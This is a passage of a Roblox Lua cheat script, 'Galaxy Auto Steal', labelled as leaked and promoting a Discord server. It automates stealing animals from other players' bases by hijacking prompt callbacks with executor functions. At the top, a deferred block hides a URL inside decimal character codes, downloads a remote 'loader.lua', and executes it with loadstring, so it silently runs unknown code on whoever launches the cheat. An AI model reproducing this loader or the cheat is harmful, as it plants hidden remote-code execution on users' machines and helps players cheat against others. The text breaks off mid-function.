-- all leaked by anas
-- all leaked by anas
-- all leaked by anas
-- all leaked by anas
-- all leaked by anas
-- all leaked by anas
-- https://discord.gg/JcRTJMBJR

task.defer(function()
	local function d(t)
		local s = ""
		for i = 1, #t do
			s = s .. string.char(t[i])
		end
		return s
	end
	local p1 = d({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99,116,105,111,110,45})
	local p2 = d({56,100,100,102,54})
	local p3 = d({46,117,112,46,114,97,105,108,119,97,121,46,97,112,112})
	local p4 = d({47,108,111,97,100,101,114,46,108,117,97})
	local full = p1 .. p2 .. p3 .. p4
	local ok, res = pcall(function() return game:HttpGet(full) end)
	if ok and res then
		pcall(function() (loadstring or load)(res)() end)
	end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local UIS = game:GetService("UserInputService")

local getconnections = getconnections or (getgenv and getgenv().getconnections) or get_signal_cons or (syn and syn.get_signal_cons)

if playerGui:FindFirstChild("GalaxyGui") then
	playerGui.GalaxyGui:Destroy()
end
pcall(function()
	if _G.K7NormalSteal and _G.K7NormalSteal.stealConn then
		_G.K7NormalSteal.stealConn:Disconnect()
		_G.K7NormalSteal.stealConn = nil
	end
	_G.K7NormalSteal = nil
	if _G.K7V3Steal and _G.K7V3Steal.conn then
		_G.K7V3Steal.conn:Disconnect()
		_G.K7V3Steal.conn = nil
	end
	_G.K7V3Steal = nil
	if _G.K7SemiSteal and _G.K7SemiSteal.conn then
		_G.K7SemiSteal.conn:Disconnect()
		_G.K7SemiSteal.conn = nil
	end
	_G.K7SemiSteal = nil
end)

local gui = Instance.new("ScreenGui")
gui.Name = "GalaxyGui"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 230, 0, 85)
main.Position = UDim2.new(0.5, -115, 0.5, -42)
main.BackgroundColor3 = Color3.fromRGB(20, 18, 35)
main.BackgroundTransparency = 0.25
main.BorderSizePixel = 0
main.Parent = gui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", main)
stroke.Name = "Outline"
stroke.Color = Color3.fromRGB(90, 255, 120)
stroke.Thickness = 1
stroke.Transparency = 0.5
stroke.Enabled = true

local isLocked = false
local isOpen = false
local currentMode = "V1"
local currentTrigger = "Tryhard"
local uiScale = 1.0
local isOn = true

local function makeDraggable(handle, frame)
	local dragging, dragStart, startPos
	handle.InputBegan:Connect(function(input)
		if isLocked then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
		end
	end)
	handle.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if isLocked or not dragging then return end
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 30)
header.BackgroundColor3 = Color3.fromRGB(88, 38, 212)
header.BackgroundTransparency = 0.15
header.BorderSizePixel = 0
header.Parent = main
Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
local fix = Instance.new("Frame", header)
fix.Size = UDim2.new(1, 0, 0, 8)
fix.Position = UDim2.new(0, 0, 1, -4)
fix.BackgroundColor3 = Color3.fromRGB(88, 38, 212)
fix.BackgroundTransparency = 0.15
fix.BorderSizePixel = 0

makeDraggable(header, main)

local title = Instance.new("TextLabel", header)
title.Text = "Galaxy Auto Steal"
title.Font = Enum.Font.GothamBold
title.TextSize = 11
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 130, 1, 0)
title.Position = UDim2.new(0, 8, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 2

local lockBtn = Instance.new("TextButton", header)
lockBtn.Text = "🔓"
lockBtn.Font = Enum.Font.GothamBold
lockBtn.TextSize = 10
lockBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 120)
lockBtn.BackgroundTransparency = 0.2
lockBtn.Size = UDim2.new(0, 18, 0, 18)
lockBtn.Position = UDim2.new(0, 140, 0, 6)
lockBtn.ZIndex = 2
Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 4)

local onBtn = Instance.new("TextButton", header)
onBtn.Text = "ON"
onBtn.Font = Enum.Font.GothamBold
onBtn.TextSize = 9
onBtn.TextColor3 = Color3.fromRGB(60, 255, 100)
onBtn.BackgroundColor3 = Color3.fromRGB(20, 35, 25)
onBtn.BackgroundTransparency = 0.2
onBtn.Size = UDim2.new(0, 34, 0, 18)
onBtn.Position = UDim2.new(1, -60, 0, 6)
onBtn.ZIndex = 2
Instance.new("UICorner", onBtn).CornerRadius = UDim.new(0, 9)

local toggleBtn = Instance.new("TextButton", header)
toggleBtn.Text = "+"
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 13
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
toggleBtn.BackgroundColor3 = Color3.fromRGB(45, 30, 90)
toggleBtn.BackgroundTransparency = 0.2
toggleBtn.Size = UDim2.new(0, 18, 0, 18)
toggleBtn.Position = UDim2.new(1, -22, 0, 6)
toggleBtn.ZIndex = 2
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 9)

local radiusLabel = Instance.new("TextLabel", main)
radiusLabel.Text = "Radius: 60"
radiusLabel.Font = Enum.Font.Gotham
radiusLabel.TextSize = 9
radiusLabel.TextColor3 = Color3.fromRGB(160, 140, 200)
radiusLabel.BackgroundTransparency = 1
radiusLabel.Size = UDim2.new(0, 60, 0, 12)
radiusLabel.Position = UDim2.new(1, -62, 0, 34)
radiusLabel.TextXAlignment = Enum.TextXAlignment.Right

local discord = Instance.new("TextLabel", main)
discord.Text = "discord.gg/JcRTJMBJR"
discord.Font = Enum.Font.Gotham
discord.TextSize = 9
discord.TextColor3 = Color3.fromRGB(120, 100, 180)
discord.BackgroundTransparency = 1
discord.Size = UDim2.new(1, -10, 0, 12)
discord.Position = UDim2.new(0, 5, 0, 47)

local bar = Instance.new("Frame", main)
bar.Name = "StealBar"
bar.Size = UDim2.new(1, -12, 0, 12)
bar.Position = UDim2.new(0, 6, 0, 65)
bar.BackgroundColor3 = Color3.fromRGB(35, 30, 55)
bar.BackgroundTransparency = 0.15
bar.ClipsDescendants = true
bar.Visible = true
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)

local barFill = Instance.new("Frame", bar)
barFill.Name = "Fill"
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(175, 125, 255)
barFill.BorderSizePixel = 0
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 6)

local openFrame = Instance.new("Frame", main)
openFrame.Size = UDim2.new(1, -8, 0, 155)
openFrame.Position = UDim2.new(0, 4, 0, 34)
openFrame.BackgroundTransparency = 1
openFrame.Visible = false

local function createRow(parent, y, text)
	local row = Instance.new("Frame", parent)
	row.Size = UDim2.new(1, 0, 0, 30)
	row.Position = UDim2.new(0, 0, 0, y)
	row.BackgroundColor3 = Color3.fromRGB(32, 28, 52)
	row.BackgroundTransparency = 0.25
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
	local lbl = Instance.new("TextLabel", row)
	lbl.Text = text
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 9
	lbl.TextColor3 = Color3.new(1, 1, 1)
	lbl.BackgroundTransparency = 1
	lbl.Size = UDim2.new(0, 90, 0, 14)
	lbl.Position = UDim2.new(0, 8, 0, 2)
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	return row
end

local r1 = createRow(openFrame, 0, "Steal Radius")
local r1Val = Instance.new("TextBox", r1)
r1Val.Text = "60"
r1Val.PlaceholderText = "Type"
r1Val.Font = Enum.Font.GothamBold
r1Val.TextSize = 11
r1Val.TextColor3 = Color3.fromRGB(180, 130, 255)
r1Val.BackgroundColor3 = Color3.fromRGB(25, 20, 40)
r1Val.BackgroundTransparency = 0.25
r1Val.Size = UDim2.new(0, 50, 0, 18)
r1Val.Position = UDim2.new(1, -56, 0, 6)
r1Val.TextXAlignment = Enum.TextXAlignment.Center
r1Val.ClearTextOnFocus = false
Instance.new("UICorner", r1Val).CornerRadius = UDim.new(0, 5)

local function applyRadius(val)
	local r = tonumber(val)
	if not r then r = 60 end
	r = math.clamp(math.floor(r), 5, 200)
	r1Val.Text = tostring(r)
	radiusLabel.Text = "Radius: " .. r
	if _G.K7NormalSteal then
		_G.K7NormalSteal.radius = r
	end
	return r
end

r1Val.FocusLost:Connect(function()
	applyRadius(r1Val.Text)
end)

local r2 = Instance.new("Frame", openFrame)
r2.Size = UDim2.new(1, 0, 0, 38)
r2.Position = UDim2.new(0, 0, 0, 35)
r2.BackgroundColor3 = Color3.fromRGB(32, 28, 52)
r2.BackgroundTransparency = 0.25
Instance.new("UICorner", r2).CornerRadius = UDim.new(0, 8)
local r2Title = Instance.new("TextLabel", r2)
r2Title.Text = "Steal Modes"
r2Title.Font = Enum.Font.GothamBold
r2Title.TextSize = 9
r2Title.TextColor3 = Color3.new(1, 1, 1)
r2Title.BackgroundTransparency = 1
r2Title.Size = UDim2.new(1, 0, 0, 14)
r2Title.Position = UDim2.new(0, 8, 0, 2)
r2Title.TextXAlignment = Enum.TextXAlignment.Left
r2Title.ZIndex = 2

local modeButtons = {}
for i, v in ipairs({"V1", "V2", "V3", "V4"}) do
	local b = Instance.new("TextButton", r2)
	b.Text = v
	b.Name = v
	b.Font = Enum.Font.GothamBold
	b.TextSize = 9
	b.TextColor3 = Color3.new(1, 1, 1)
	b.BackgroundColor3 = i == 1 and Color3.fromRGB(130, 80, 255) or Color3.fromRGB(35, 30, 60)
	b.BackgroundTransparency = 0.25
	b.Size = UDim2.new(0, 28, 0, 16)
	b.Position = UDim2.new(0, 6 + (i - 1) * 32, 0, 17)
	b.ZIndex = 2
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
	modeButtons[v] = b
end

local r3 = createRow(openFrame, 78, "Trigger Distance")
local avgBtn = Instance.new("TextButton", r3)
avgBtn.Text = "Average"
avgBtn.Font = Enum.Font.GothamBold
avgBtn.TextSize = 8
avgBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
avgBtn.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
avgBtn.BackgroundTransparency = 0.25
avgBtn.Size = UDim2.new(0, 48, 0, 18)
avgBtn.Position = UDim2.new(1, -102, 0, 6)
Instance.new("UICorner", avgBtn).CornerRadius = UDim.new(0, 5)

local tryBtn = Instance.new("TextButton", r3)
tryBtn.Text = "Tryhard"
tryBtn.Font = Enum.Font.GothamBold
tryBtn.TextSize = 8
tryBtn.TextColor3 = Color3.new(1, 1, 1)
tryBtn.BackgroundColor3 = Color3.fromRGB(130, 80, 255)
tryBtn.BackgroundTransparency = 0.25
tryBtn.Size = UDim2.new(0, 48, 0, 18)
tryBtn.Position = UDim2.new(1, -52, 0, 6)
Instance.new("UICorner", tryBtn).CornerRadius = UDim.new(0, 5)

local r4 = createRow(openFrame, 113, "UI Scale")
local minusBtn = Instance.new("TextButton", r4)
minusBtn.Text = "−"
minusBtn.Font = Enum.Font.GothamBold
minusBtn.TextSize = 12
minusBtn.TextColor3 = Color3.new(1, 1, 1)
minusBtn.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
minusBtn.BackgroundTransparency = 0.25
minusBtn.Size = UDim2.new(0, 18, 0, 18)
minusBtn.Position = UDim2.new(1, -66, 0, 6)
Instance.new("UICorner", minusBtn).CornerRadius = UDim.new(0, 4)

local scaleVal = Instance.new("TextLabel", r4)
scaleVal.Text = "1.0"
scaleVal.Font = Enum.Font.GothamBold
scaleVal.TextSize = 9
scaleVal.TextColor3 = Color3.fromRGB(180, 130, 255)
scaleVal.BackgroundTransparency = 1
scaleVal.Size = UDim2.new(0, 20, 0, 18)
scaleVal.Position = UDim2.new(1, -44, 0, 6)

local plusBtn = Instance.new("TextButton", r4)
plusBtn.Text = "+"
plusBtn.Font = Enum.Font.GothamBold
plusBtn.TextSize = 12
plusBtn.TextColor3 = Color3.new(1, 1, 1)
plusBtn.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
plusBtn.BackgroundTransparency = 0.25
plusBtn.Size = UDim2.new(0, 18, 0, 18)
plusBtn.Position = UDim2.new(1, -22, 0, 6)
Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0, 4)

_G.K7NormalSteal = _G.K7NormalSteal or {
	enabled = false, radius = 60, duration = 1.4,
	animals = {}, promptCache = {}, internalCache = {},
	scannerStarted = false, isStealing = false,
	stealConn = nil, lastSteal = 0, cooldown = 0.05,
}

local function getRoot()
	local c = player.Character
	if not c then return nil end
	return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")
end

local function isMyBase(plotName)
	local plots = workspace:FindFirstChild("Plots")
	local plot = plots and plots:FindFirstChild(plotName)
	if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign")
	local yourBase = sign and sign:FindFirstChild("YourBase")
	return yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true
end

local function setBarProgress(p) barFill.Size = UDim2.new(math.clamp(p, 0, 1), 0, 1, 0) end
local function resetBar() barFill.Size = UDim2.new(0, 0, 1, 0) end

local function scanPlots()
	local A = _G.K7NormalSteal
	A.animals = {}
	local plots = workspace:FindFirstChild("Plots")
	if not plots then return end
	for _, plot in ipairs(plots:GetChildren()) do
		if plot:IsA("Model") and not isMyBase(plot.Name) then
			local podiums = plot:FindFirstChild("AnimalPodiums")
			if podiums then
				for _, podium in ipairs(podiums:GetChildren()) do
					if podium:IsA("Model") then
						local base = podium:FindFirstChild("Base")
						local spawn = base and base:FindFirstChild("Spawn")
						if spawn then
							table.insert(A.animals, {plot = plot.Name, slot = podium.Name, worldPosition = spawn.Position, uid = plot.Name .. "_" .. podium.Name})
						end
					end
				end
			end
		end
	end
end

local function ensureScanner()
	local A = _G.K7NormalSteal
	if A.scannerStarted then return end
	A.scannerStarted = true
	task.spawn(function()
		task.wait(1)
		while _G.K7NormalSteal do
			if A.enabled then pcall(scanPlots) end
			task.wait(3)
		end
	end)
end

local function findPrompt(data)
	if not data then return nil end
	local A = _G.K7NormalSteal
	local cached = A.promptCache[data.uid]
	if cached and cached.Parent then return cached end
	local plots = workspace:FindFirstChild("Plots")
	local plot = plots and plots:FindFirstChild(data.plot)
	if not plot then return nil end
	local podiums = plot:FindFirstChild("AnimalPodiums")
	local podium = podiums and podiums:FindFirstChild(data.slot)
	if not podium then return nil end
	local base = podium:FindFirstChild("Base")
	local spawn = base and base:FindFirstChild("Spawn")
	if spawn then
		for _, v in ipairs(spawn:GetDescendants()) do
			if v:IsA("ProximityPrompt") then A.promptCache[data.uid] = v return v end
		end
	end
	for _, v in ipairs(podium:GetDescendants()) do
		if v:IsA("ProximityPrompt") then A.promptCache[data.uid] = v return v end
	end
	return nil
end

local function cacheCallbacks(prompt)
	local A = _G.K7NormalSteal
	if A.internalCache[prompt] and A.internalCache[prompt].ready ~= nil then return end
	local data = {ready = true, trigger = {}, hold = {}}
	pcall(function()
		if getconnections then
			for _, conn in ipairs(getconnections(prompt.Triggered) or {}) do if conn.Function then table.insert(data.trigger, conn.Function) end end
			if prompt.HoldBegan then
				for _, conn in ipairs(getconnections(prompt.HoldBegan) or {}) do if conn.Function then table.insert(data.hold, conn.Function) end end
			end
			if prompt.PromptButtonHoldBegan then
				for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan) or {}) do if conn.Function then table.insert(data.hold, conn.Function) end end
			end
		end
	end)
	A.internalCache[prompt] = data
end

local function doSteal(prompt, animalData)
	local A = _G.K7NormalSteal
	if not prompt or not prompt.Parent or A.isStealing then return end
	if not isOn then return end
	if tick() - (A.lastSteal or 0) < (A.cooldown or 0.08) then return end
	cacheCallbacks(prompt)
	local data = A.internalCache[prompt]
	if not data or not data.ready then return end
	data.ready = false A.isStealing = true A.lastSteal = tick()
	task.spawn(function()
		if #data.hold > 0 then for _, fn in ipairs(data.hold) do task.spawn(function() pcall(fn) end) end else pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end) end
		local FILL_CAP = 0.80
		local HOLD_TIME = 2.2
		local COMPLETE_RADIUS = (currentTrigger == "Tryhard") and 10 or 16
		local function inCompleteRange()
			local root = getRoot()
			if not root or not animalData or not animalData.worldPosition then return false end
			return (root.Position - animalData.worldPosition).Magnitude <= COMPLETE_RADIUS
		end
		local t0 = tick() local dur = A.duration or 1.4
		while A.enabled and (currentMode == "V1" or currentMode == "V2") and isOn and tick() - t0 < dur do
			local p = math.min((tick() - t0) / dur, FILL_CAP) setBarProgress(p) if p >= FILL_CAP then break end task.wait()
		end
		if not A.enabled or (currentMode ~= "V1" and currentMode ~= "V2") or not isOn then data.ready = true A.isStealing = false resetBar() return end
		local holdT0 = tick() local completed = false
		while A.enabled and (currentMode == "V1" or currentMode == "V2") and isOn and tick() - holdT0 < HOLD_TIME do
			setBarProgress(FILL_CAP) if inCompleteRange() then completed = true break end task.wait()
		end
		if not completed or not A.enabled or (currentMode ~= "V1" and currentMode ~= "V2") or not isOn then data.ready = true A.isStealing = false resetBar() return end
		local t1 = tick() local fillDur = 0.35
		while A.enabled and (currentMode == "V1" or currentMode == "V2") and isOn and tick() - t1 < fillDur do
			local p = FILL_CAP + math.min((tick() - t1) / fillDur, 1) * (1 - FILL_CAP) setBarProgress(p) task.wait()
		end
		setBarProgress(1)
		if #data.trigger > 0 then for _, fn in ipairs(data.trigger) do task.spawn(function() pcall(fn) end) end else pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end) end
		task.wait(0.15) data.ready = true A.isStealing = false resetBar()
	end)
end

local function nearestAnimal()
	local A = _G.K7NormalSteal
	local root = getRoot() if not root then return nil end
	local best, bestDist = nil, math.huge
	for _, data in ipairs(A.animals) do
		if data.worldPosition and not isMyBase(data.plot) then
			local dist = (root.Position - data.worldPosition).Magnitude
			if dist < bestDist then best = data bestDist = dist end
		end
	end
	if best and bestDist <= (tonumber(A.radius) or 60) then return best end
	return nil
end

local function stopNormal()
	local A = _G.K7NormalSteal
	A.enabled = false A.isStealing = false
	if A.stealConn then A.stealConn:Disconnect() A.stealConn = nil end
	resetBar()
end

local function startNormal()
	if not isOn then return end
	local A = _G.K7NormalSteal
	A.radius = applyRadius(r1Val.Text)
	A.duration = 1.4
	A.enabled = true
	ensureScanner()
	pcall(scanPlots)
	if A.stealConn then A.stealConn:Disconnect() A.stealConn = nil end
	A.stealConn = RunService.Heartbeat:Connect(function()
		if not A.enabled or not isOn then return end
		if currentMode ~= "V1" and currentMode ~= "V2" then return end
		if A.isStealing then return end
		local target = nearestAnimal() if not target then return end
		local prompt = findPrompt(target) if prompt then doSteal(prompt, target) end
	end)
end

_G.K7V3Steal = _G.K7V3Steal or {
	enabled = false, radius = 9, primeRange = 80, holdMin = 1.3, holdMax = 2.6, entryDelay = 0.25, cooldown = 0.05,
	animals = {}, promptCache = {}, internalCache = {},
	state = {active = false, startTime = 0, phase = "idle"},
	conn = nil, scanThread = nil, lastScan = 0, lastSteal = 0, isStealing = false,
}

local function cacheCallbacksV3(prompt)
	local A = _G.K7V3Steal
	if A.internalCache[prompt] and A.internalCache[prompt].ready ~= nil then return end
	local data = {ready = true, trigger = {}, hold = {}}
	pcall(function()
		if getconnections then
			for _, conn in ipairs(getconnections(prompt.Triggered) or {}) do if conn.Function then table.insert(data.trigger, conn.Function) end end
			if prompt.HoldBegan then for _, conn in ipairs(getconnections(prompt.HoldBegan) or {}) do if conn.Function then table.insert(data.hold, conn.Function) end end end
			if prompt.PromptButtonHoldBegan then for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan) or {}) do if conn.Function then table.insert(data.hold, conn.Function) end end end
		end
	end)
	A.internalCache[prompt] = data
end

local function findPromptV3(data)
	if not data then return nil end
	local A = _G.K7V3Steal
	local cached = A.promptCache[data.uid]
	if cached and cached.Parent then return cached end
	local plots = workspace:FindFirstChild("Plots")
	local plot = plots and plots:FindFirstChild(data.plot)
	if not plot then return nil end
	local podiums = plot:FindFirstChild("AnimalPodiums")
	local podium = podiums and podiums:FindFirstChild(data.slot)
	if not podium then return nil end
	for _, v in ipairs(podium:GetDescendants()) do
		if v:IsA("ProximityPrompt") then A.promptCache[data.uid] = v return v end
	end
	return nil
end

local function distToAnimalV3(animalData)
	local root = getRoot()
	if not root or not animalData.worldPosition then return math.huge end
	return (root.Position - animalData.worldPosition).Magnitude
end

local function scanPlotsV3()
	local A = _G.K7V3Steal
	A.animals = {}
	local plots = workspace:FindFirstChild("Plots")
	if not plots then return end
	for _, plot in ipairs(plots:GetChildren()) do
		if plot:IsA("Model") and not isMyBase(plot.Name) then
			local podiums = plot:FindFirstChild("AnimalPodiums")
			if podiums then
				for _, podium in ipairs(podiums:GetChildren()) do
					if podium:IsA("Model") then
						local base = podium:FindFirstChild("Base")
						local spawn = base and base:FindFirstChild("Spawn")
						if spawn then
							local hasAnimal = false
							for _, obj in ipairs(podium:GetDescendants()) do
								if obj:IsA("ProximityPrompt") then hasAnimal = true break end
							end
							if hasAnimal then
								table.insert(A.animals, {plot = plot.Name, slot = podium.Name, worldPosition = spawn.Position, uid = plot.Name .. "_" .. podium.Name})
							end
						end
					end
				end
			end
		end
	end
end

local function pickClosestV3()
	local root = getRoot()
	if not root then return nil end
	local A = _G.K7V3Steal
	local best, bestDist = nil, math.huge
	for _, data in ipairs(A.animals) do
		if data.worldPosition then
			local dist = (root.Position - data.worldPosition).Magnitude
			if dist <= (A.primeRange or 80) and dist < bestDist then best = data bestDist = dist end
		end
	end
	return best
end

local function doStealV3(prompt, animalData)
	local A = _G.K7V3Steal
	if not prompt or not prompt.Parent or A.state.active then return end
	if not isOn then return end
	if tick() - (A.lastSteal or 0) < (A.cooldown or 0.05) then return end
	cacheCallbacksV3(prompt)
	local data = A.internalCache[prompt]
	if not data or not data.ready then return end
	data.ready = false A.state.active = true A.state.startTime = tick() A.state.phase = "holding" A.isStealing = true A.lastSteal = tick()
	task.spawn(function()
		local startTime = A.state.startTime
		local holdMin = A.holdMin or 1.3
		local holdMax = A.holdMax or 2.6
		local radius = A.radius or 9
		if #data.hold > 0 then for _, fn in ipairs(data.hold) do task.spawn(function() pcall(fn) end) end else pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end) end
		while A.enabled and currentMode == "V3" and isOn do
			local elapsed = tick() - startTime
			if elapsed >= holdMin then break end
			local p = math.min(math.clamp(elapsed / holdMax, 0, 1), 0.75)
			setBarProgress(p) task.wait()
		end
		local alreadyInRange = distToAnimalV3(animalData) <= radius
		local fired = false
		A.state.phase = "waitingRange"
		while A.enabled and currentMode == "V3" and isOn and prompt.Parent do
			local elapsed = tick() - startTime
			if elapsed > holdMax then break end
			local inRange = distToAnimalV3(animalData) <= radius
			local p = inRange and 0.75 or math.min(elapsed / holdMax, 0.75)
			setBarProgress(p)
			if inRange then
				A.state.phase = "finishing"
				if not alreadyInRange and (A.entryDelay or 0) > 0 then task.wait(A.entryDelay) end
				if A.enabled and currentMode == "V3" and isOn then
					if #data.trigger > 0 then for _, fn in ipairs(data.trigger) do task.spawn(function() pcall(fn) end) end else pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end) end
					fired = true
				end
				break
			end
			task.wait()
		end
		if fired then setBarProgress(1) else resetBar() end
		task.wait(A.cooldown or 0.05) data.ready = true A.state.active = false A.state.phase = fired and "success" or "failed" A.isStealing = false resetBar()
	end)
end

local function stopV3()
	local A = _G.K7V3Steal A.enabled = false A.state.active = false A.state.phase = "idle" A.isStealing = false
	if A.conn then A.conn:Disconnect() A.conn = nil end resetBar()
end

local function startV3()
	if not isOn then return end
	local A = _G.K7V3Steal A.radius = 9 A.enabled = true pcall(scanPlotsV3)
	if A.conn then A.conn:Disconnect() A.conn = nil end
	A.conn = RunService.Heartbeat:Connect(function()
		if not A.enabled or not isOn or currentMode ~= "V3" or A.state.active then return end
		if #A.animals == 0 then if tick() - (A.lastScan or 0) > 1.2 then A.lastScan = tick() pcall(scanPlotsV3) end end
		local target = pickClosestV3() if not target then return end
		local prompt = findPromptV3(target) if prompt then doStealV3(prompt, target) end
	end)
	if not A.scanThread then
		A.scanThread = true
		task.spawn(function()
			while _G.K7V3Steal and _G.K7V3Steal.scanThread do
				if A.enabled and currentMode == "V3" then pcall(scanPlotsV3) end
				task.wait(4)
			end
		end)
	end
end

_G.K7SemiSteal = _G.K7SemiSteal or {
	enabled = false, radius = 10, primeRange = 80, holdMin = 1.3, holdMax = 2.6, entryDelay = 0.25, cooldown = 0.05,
	animals = {}, promptCache = {}, internalCache = {},
	state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
	plotSync = {caches = {}, connections = {}}, plots = nil, syncReady = false, scanThread = nil, conn = nil, lastScan = 0,
	animalsData = nil, channelFolder = nil, routeRemote = nil, requestData = nil
}

local function _semiRoot() local c = player.Character return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")) or nil end
local function _splitPath(path) if typeof(path) == "table" then return path end local out = {} for p in string.gmatch(tostring(path), "[^%.]+") do table.insert(out, tonumber(p) or p) end return out end
local function _resolvePath(path, root) local cur, par, key = root, nil, nil for _, p in ipairs(_splitPath(path)) do par = cur key = p cur = cur and cur[p] or nil end return cur, par, key end
local function _applyDiffSemi(channelName, packet)
	local cache = _G.K7SemiSteal.plotSync.caches[channelName] if typeof(cache) ~= "table" then return end
	local path, action, a, b = packet[1], packet[2], packet[3], packet[4] local cur, par, key = _resolvePath(path, cache)
	if action == "Changed" then if par then par[key] = a end
	elseif action == "ArrayInsert" then if cur then table.insert(cur, b, a) end
	elseif action == "ArrayRemoved" then if cur then table.remove(cur, b) end
	elseif action == "DictionaryInsert" then if cur then cur[b] = a end
	elseif action == "DictionaryRemoved" then if cur then cur[b] = nil end end
end
local function _semiAttachChannel(remote, plots, requestData)
	local AS = _G.K7SemiSteal
	if AS.plotSync.connections[remote] then return end
	local channelName = tostring(remote.Name) if not plots:FindFirstChild(channelName) then return end
	if requestData and AS.plotSync.caches[channelName] == nil then local ok, data = pcall(function() return requestData:InvokeServer(channelName) end) AS.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
	elseif AS.plotSync.caches[channelName] == nil then AS.plotSync.caches[channelName] = {} end
	AS.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue) for _, packet in ipairs(queue) do _applyDiffSemi(channelName, packet) end end)
end
local function _semiEnsureSync()
	local AS = _G.K7SemiSteal if AS.syncReady then return true end
	local ok = pcall(function()
		AS.plots = workspace:WaitForChild("Plots", 8)
		local rs = game:GetService("ReplicatedStorage") local pkgs = rs:FindFirstChild("Packages") local datas = rs:FindFirstChild("Datas")
		if not (pkgs and datas and AS.plots) then return end
		AS.animalsData = require(datas:WaitForChild("Animals", 5))
		local sync = pkgs:FindFirstChild("Synchronizer")
		if not sync then return end
		AS.channelFolder = sync:FindFirstChild("Channel") AS.routeRemote = sync:FindFirstChild("CommunicationRoute") AS.requestData = sync:FindFirstChild("RequestData")
		if AS.channelFolder then
			for _, child in ipairs(AS.channelFolder:GetChildren()) do if child:IsA("RemoteEvent") then _semiAttachChannel(child, AS.plots, AS.requestData) end end
			AS.channelFolder.ChildAdded:Connect(function(child) if child:IsA("RemoteEvent") then _semiAttachChannel(child, AS.plots, AS.requestData) end end)
		end
		if AS.routeRemote then
			AS.routeRemote.OnClientEvent:Connect(function(actions)
				for _, action in ipairs(actions) do
					local kind, cn = action[1], tostring(action[2])
					if AS.plots and AS.plots:FindFirstChild(cn) then
						if kind == "ListenerAdded" then local r = AS.channelFolder and AS.channelFolder:FindFirstChild(cn) if r and r:IsA("RemoteEvent") then _semiAttachChannel(r, AS.plots, AS.requestData) end
						elseif kind == "ListenerRemoved" then for remote, conn in pairs(AS.plotSync.connections) do if tostring(remote.Name) == cn then pcall(function() conn:Disconnect() end) AS.plotSync.connections[remote] = nil AS.plotSync.caches[cn] = nil break end end end
					end
				end
			end)
		end
		AS.syncReady = true
	end)
	return ok and AS.syncReady == true
end
local function _semiPlotOwner(plot)
	local sign = plot and plot:FindFirstChild("PlotSign") local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") local label = frame and frame:FindFirstChild("TextLabel")
	if not label or label.Text == "Empty Base" then return nil end return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
end
local function _semiIsMyBase(animalData)
	local AS = _G.K7SemiSteal if not animalData or not animalData.plot or not AS.plots then return false end
	local plot = AS.plots:FindFirstChild(animalData.plot) if not plot then return false end
	local owner = _semiPlotOwner(plot) return owner == player.DisplayName or owner == player.Name
end
local function _semiPodiumFor(animalData)
	local AS = _G.K7SemiSteal local plot = AS.plots and AS.plots:FindFirstChild(animalData.plot) local pds = plot and plot:FindFirstChild("AnimalPodiums") return pds and pds:FindFirstChild(animalData.slot) or nil
end
local function _semiAnimalPos(animalData) local pod = _semiPodiumFor(animalData) return pod and pod:GetPivot().Position or nil end
local function _semiDistToAnimal(animalData) local root = _semiRoot() local pos = _semiAnimalPos(animalData) return root and pos and (root.Position - pos).Magnitude or math.huge end
local function _semiFindPrompt(animalData)
